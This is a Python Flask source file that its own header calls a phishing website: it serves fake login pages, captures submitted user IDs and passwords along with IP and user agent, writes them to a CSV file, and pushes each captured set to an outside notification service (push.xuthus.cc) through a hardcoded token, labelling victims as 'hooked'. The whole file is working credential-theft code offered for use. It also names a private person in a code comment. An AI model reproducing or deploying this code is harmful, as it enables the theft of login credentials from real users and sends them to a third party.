'''
Author: whalefall
Date: 2021-04-04 01:56:10
LastEditTime: 2021-04-04 15:23:02
Description: Flask框架钓鱼网站
'''
from flask import *
import os
import csv
import time
import codecs
from colorama import *  # 跨平台颜色输出
import requests

init(autoreset=True)  # 初始化,并且设置颜色设置自动恢复

app = Flask(__name__)

app.config.from_pyfile(os.path.join(
    os.path.abspath(os.path.dirname(__file__)), "config.py"))


def writeCSV(**keyword):

    # 路径
    path = os.path.join(os.path.abspath(
        os.path.dirname(__file__)), "result.csv")

    userid = keyword.get("userid")
    pwd = keyword.get("pwd")
    ua = keyword.get("ua")
    ip = keyword.get("ip")
    _time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    data = {
        "time": _time,
        "userid": userid,
        "pwd": pwd,
        "ua": ua,
        "ip": ip
    }
    try:
        with codecs.open(path, "a", encoding="utf_8_sig") as cvs_file:

            headers = ["time", "userid", "pwd", "ua", "ip"]  # 表头
            writer = csv.DictWriter(cvs_file, headers)
            # writer.writeheader()  # 写表头
            writer.writerow(data)

        print("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
              (_time, userid, pwd, ua, ip))

        # 上钩推送酷退
        bot.pushSend("[%s]UserID:%s pwd:%s ua:%s ip:%s 已上勾勾" %
                     (_time, userid, pwd, ua, ip))

        return True
    except:
        return False


class Logging(object):

    def __init__(self):
        pass

    def debug(self, msg):
        print(Fore.BLACK+Back.WHITE+"[DEBUG]"+msg)

    def info(self, msg):
        print(Fore.BLACK+Back.BLUE+"[INFO]"+msg)

    def warning(self, msg):
        print(Fore.YELLOW+Back.BLACK+"[WARNING]"+msg)

    def error(self, msg):
        print(Fore.RED+Back.BLACK+"[ERROR]"+msg)

    def critical(self, msg):
        print(Fore.BLACK+Back.RED+"[CRITICAL]"+msg)

# 酷q推送


class CoolPush():

    def __init__(self, token):

        self.token = token

        self.headers = {
            "User-Agent": "Mozilla/5.0 (WeiboMonitor; Win64; x64) Chrome/80.0.3987.163 Safari/537.36"
        }

    def pushSend(self, content):
        url = "https://push.xuthus.cc/send/%s" % (self.token)
        data = {
            "c": content,
        }
        try:
            resp = requests.get(url, headers=self.headers, params=data)

            if resp.json()["code"] != 200:
                log.error("[CoolPush]推送出现异常,响应:%s" % (resp.text))
            else:
                log.info("[CoolPush]推送成功")
        except:
            log.error("[CoolPush]推送失败!")

    def pushGoup(self, content):
        url = "https://push.xuthus.cc/group/%s" % (self.token)
        data = {
            "c": content,
        }
        try:
            resp = requests.get(url, headers=self.headers, params=data)

            if resp.json()["code"] != 200:
                log.error("[CoolPush]推送出现异常,响应:%s" % (resp.text))
            else:
                log.info("[CoolPush]推送成功")
        except:
            log.error("[CoolPush]推送失败!")


@app.route('/', methods=["GET", "POST"])
def index():
    # 防止浏览器缓存
    return render_template('index.html', rand=int(time.time()))


@app.route('/KsLoginAction/', methods=["GET", "POST"])
def login_index():
    return render_template('KsLoginAction.html')


@app.route('/KsLoginSuccessAction/', methods=["GET", "POST"])
def loginAPI():

    if request.method == "GET":
        data = request.args
    elif request.method == "POST":

        data = request.form
    else:
        return "只接受GET POST请求"

    if data == None:
        return "请传入请求参数 --彩蛋 我喜欢黄颖怡 希望和她一所高中"

    userid = data.get("userid")
    pwd = data.get("password")
    ua = request.headers.get('User-Agent')
    ip = request.remote_addr

    if writeCSV(userid=userid, pwd=pwd, ua=ua, ip=ip):
        pass
    else:
        render_template("error.html", title="未知错误", c="未知错误请联系管理员")

    if userid == "" or userid == None or pwd == "" or pwd == None:
        return render_template("KsLoginAction.html", status="empty")

    # return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)
    return redirect("/LoginSuccessAction/%s/%s/%s" % (userid, ip, ua.replace("/","-")))


@app.route('/LoginSuccessAction/<userid>/<ip>/<ua>', methods=["GET", "POST"])
def suc_index(userid,ip,ua):
    return render_template("KsLoginSuccessAction.html", userid=userid, ip=ip, ua=ua)

@app.errorhandler(404)
def page_not_found(e):
    return render_template("error.html", title="无法找到该页面", c="无法找到资源,请返回主页")


if __name__ == "__main__":
    bot = CoolPush("92f83d0596c7b553ea1df9f242e4fc46")
    log = Logging()
    app.run(host="0.0.0.0", port=5000, threaded=True)
